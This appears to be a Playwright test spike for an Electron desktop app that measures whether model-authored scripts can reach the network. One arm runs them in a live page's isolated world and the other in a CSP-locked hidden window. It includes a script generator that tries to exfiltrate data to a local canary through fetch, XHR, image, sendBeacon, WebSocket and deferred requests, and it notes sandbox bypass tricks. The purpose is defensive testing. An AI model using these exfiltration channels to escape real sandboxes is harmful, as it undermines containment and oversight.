import { resolve, join } from 'node:path';
import { mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { test, expect, _electron as electron, type ElectronApplication } from '@playwright/test';
import { pollEvaluate } from './poll-evaluate';

/**
 * SPIKE (go/no-go, S5 PR0): **can a model-authored script be run against page content without giving it
 * a way onto the network?**
 *
 * The phase doc puts this gate before any code-execution capability: *"if the isolated world cannot be
 * proven network-inert on this Electron/Chromium, the phase does not proceed to PR1."* It is answered by
 * measurement, not argument. A **canary server** records every request it receives; the only evidence
 * that counts is whether it was touched.
 *
 * Two arms, because the design the phase proposed and the design that survives measurement are not the
 * same one:
 *
 * - **Arm A — the live page's isolated world**, which the doc proposed on the reasoning that a world
 *   sharing the DOM but not the page's JS principal "cannot exfiltrate on its own".
 * - **Arm B — a hidden window in a locked-down session**, enforcing below the JS engine instead.
 *
 * A JS-level defence is not a boundary at all: `globalThis`, `Function('return this')()`, and a fresh
 * iframe's `contentWindow` all hand back a deleted `fetch`. Only something under the engine can hold.
 */

const appDir = resolve(process.cwd(), 'apps/desktop');

/**
 * The sandbox document.
 *
 * `default-src 'none'` denies every fetch directive Blink has — connect (fetch/XHR/WebSocket/
 * EventSource/sendBeacon), img, script, frame — and it is delivered in the markup so it is in force from
 * parse time, before a single script runs. CSP is enforced below the JS engine, so a script cannot lift
 * it. This layer exists because of a **measured** finding in this very file: Electron's `webRequest` does
 * not intercept the WebSocket handshake, so the session filter alone left `ws://` open.
 */
const SANDBOX_DOCUMENT = `data:text/html,${encodeURIComponent(
  '<!doctype html><html><head><meta http-equiv="Content-Security-Policy" ' +
    'content="default-src \'none\'"></head><body></body></html>',
)}`;

function guiEnv(): Record<string, string> {
  const env: Record<string, string> = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (v !== undefined && k !== 'ELECTRON_RUN_AS_NODE') env[k] = v;
  }
  return env;
}

/** Every way a script in a DOM world can reach the network, aimed at one canary. */
function exfilAttempts(canary: string): string {
  const ws = canary.replace('http://', 'ws://');
  return `(async () => {
    const hit = (tag) => ${JSON.stringify(canary)} + '/' + tag;
    const tried = [];
    try { void fetch(hit('fetch')); tried.push('fetch'); } catch (e) { tried.push('fetch:threw'); }
    try {
      const x = new XMLHttpRequest();
      x.open('GET', hit('xhr'), true);
      x.send();
      tried.push('xhr');
    } catch (e) { tried.push('xhr:threw'); }
    try { new Image().src = hit('img'); tried.push('img'); } catch (e) { tried.push('img:threw'); }
    try { navigator.sendBeacon(hit('beacon'), 'x'); tried.push('beacon'); } catch (e) { tried.push('beacon:threw'); }
    try { new WebSocket(${JSON.stringify(ws)} + '/ws'); tried.push('ws'); } catch (e) { tried.push('ws:threw'); }
    // Deferred: fires after any "block only while the script runs" window would have closed.
    try { setTimeout(() => { void fetch(hit('deferred')); }, 300); tried.push('deferred'); } catch (e) { tried.push('deferred:threw'); }
    return tried.join(',');
  })()`;
}

interface Canary {
  server: Server;
  origin: string;
  hits: string[];
}

async function startCanary(): Promise<Canary> {
  const hits: string[] = [];
  const server = createServer((req, res) => {
    hits.push(req.url ?? '');
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('ok');
  });
  server.on('upgrade', (req) => {
    hits.push(`upgrade:${req.url ?? ''}`);
  });
  await new Promise<void>((r) => {
    server.listen(0, '127.0.0.1', () => {
      r();
    });
  });
  const port = (server.address() as AddressInfo).port;
  return { server, origin: `http://127.0.0.1:${String(port)}`, hits };
}

function profile(name: string): string {
  const dir = join(process.cwd(), `.spike-${name}`);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'preferences.json'), '{}');
  return dir;
}

/** Give every attempt — including the 300ms deferred one — time to land before we judge. */
async function settle(): Promise<void> {
  await new Promise<void>((r) => setTimeout(r, 1500));
}

/** Run `code` inside the two-layer sandbox and return whatever it produced. */
async function runInSandbox(
  app: ElectronApplication,
  input: { code: string; html: string; doc: string; partition: string },
): Promise<string> {
  return app.evaluate(
    async (
      { BrowserWindow, session },
      arg: { code: string; html: string; doc: string; partition: string },
    ) => {
      // Layer 1: cancel every request that could reach a network or a disk. `about:` and `data:` are the
      // only schemes the sandbox document itself needs, and neither leaves the process.
      const ses = session.fromPartition(arg.partition);
      ses.webRequest.onBeforeRequest((details, callback) => {
        const local = details.url.startsWith('about:') || details.url.startsWith('data:');
        callback({ cancel: !local });
      });
      const win = new BrowserWindow({
        show: false,
        webPreferences: {
          session: ses,
          contextIsolation: true,
          sandbox: true,
          nodeIntegration: false,
        },
      });
      try {
        // Layer 2: the CSP document. See SANDBOX_DOCUMENT — this is what covers WebSocket.
        await win.loadURL(arg.doc);
        // The page's HTML is COPIED IN, never loaded. innerHTML does not execute scripts, so the page's
        // own JS never runs here: the sandbox holds data, not a live origin.
        await win.webContents.executeJavaScript(
          `document.body.innerHTML = ${JSON.stringify(arg.html)}; 'ok'`,
        );
        return (await win.webContents.executeJavaScriptInIsolatedWorld(999, [
          { code: arg.code },
        ])) as string;
      } finally {
        win.destroy();
      }
    },
    input,
  );
}

test('ARM A: a script in the live page’s isolated world REACHES the network (the naive design fails)', async () => {
  const canary = await startCanary();
  const page = await startCanary(); // a second local server, so there is a real page to attach a world to
  const dir = profile('codeexec-a');
  const app: ElectronApplication = await electron.launch({
    args: [`--user-data-dir=${dir}`, appDir],
    env: guiEnv(),
  });
  try {
    const window = await app.firstWindow();
    const omnibox = window.getByRole('combobox').first();
    await expect(omnibox).toBeVisible();
    await omnibox.fill(`${page.origin}/`);
    await omnibox.press('Enter');
    await expect
      .poll(
        () =>
          pollEvaluate(
            () =>
              app.evaluate(({ webContents }) =>
                webContents
                  .getAllWebContents()
                  .map((w) => w.getURL())
                  .join(' '),
              ),
            '',
          ),
        { timeout: 20_000 },
      )
      .toContain(page.origin);

    const tried = await app.evaluate(
      async ({ webContents }, { needle, code }: { needle: string; code: string }) => {
        const wc = webContents.getAllWebContents().find((w) => w.getURL().includes(needle));
        if (wc === undefined) return 'no-webcontents';
        // Exactly the mechanism the phase doc proposed for model-authored scripts.
        return (await wc.executeJavaScriptInIsolatedWorld(999, [{ code }])) as string;
      },
      { needle: page.origin, code: exfilAttempts(canary.origin) },
    );
    expect(tried).toContain('fetch');
    await settle();

    // The measured answer, and it is a NO-GO for the naive design: an isolated world is a JS-principal
    // boundary, not a network one. It shares the frame, so it shares the frame's network access.
    expect(canary.hits.length).toBeGreaterThan(0);
  } finally {
    await app.close();
    canary.server.close();
    page.server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('ARM B: the two-layer sandbox reaches NOTHING — WebSocket and deferred attempts included', async () => {
  const canary = await startCanary();
  const dir = profile('codeexec-b');
  const app: ElectronApplication = await electron.launch({
    args: [`--user-data-dir=${dir}`, appDir],
    env: guiEnv(),
  });
  try {
    await app.firstWindow();
    const tried = await runInSandbox(app, {
      code: exfilAttempts(canary.origin),
      html: '<table><tr><td id="cell">42</td></tr></table>',
      doc: SANDBOX_DOCUMENT,
      partition: 'spike-extraction-sandbox',
    });
    expect(tried).toContain('fetch'); // the attempts really were made
    await settle();

    // Zero. Not "blocked at the JS level" — never allowed onto the wire. Both layers are load-bearing:
    // the session filter alone measurably let `ws://` through.
    expect(canary.hits).toEqual([]);
  } finally {
    await app.close();
    canary.server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('ARM B still reads the DOM it was given — inert, not useless', async () => {
  const canary = await startCanary();
  const dir = profile('codeexec-c');
  const app: ElectronApplication = await electron.launch({
    args: [`--user-data-dir=${dir}`, appDir],
    env: guiEnv(),
  });
  try {
    await app.firstWindow();
    const value = await runInSandbox(app, {
      code: `Array.from(document.querySelectorAll('td')).map((c) => c.textContent).join('|')`,
      html: '<table><tr><td>alpha</td><td>beta</td></tr><tr><td>gamma</td><td>delta</td></tr></table>',
      doc: SANDBOX_DOCUMENT,
      partition: 'spike-extraction-sandbox-read',
    });
    // The whole point of the capability: bulk extraction in one call instead of N clicks.
    expect(value).toBe('alpha|beta|gamma|delta');
    await settle();
    expect(canary.hits).toEqual([]);
  } finally {
    await app.close();
    canary.server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
